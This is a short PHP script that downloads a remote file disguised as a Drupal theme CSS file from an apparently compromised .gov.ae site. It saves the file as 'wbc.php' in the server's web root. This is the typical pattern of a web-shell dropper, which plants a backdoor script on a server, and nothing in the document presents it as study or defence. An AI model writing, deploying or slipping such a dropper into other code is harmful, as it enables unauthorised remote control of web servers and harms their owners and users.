<?php
$file = file_get_contents('http://sam.gov.ae/sites/all/themes/drupalexp/assets/css/drupalexp-sh.css');
file_put_contents("/var/www/html/wbc.php",$file);
?>
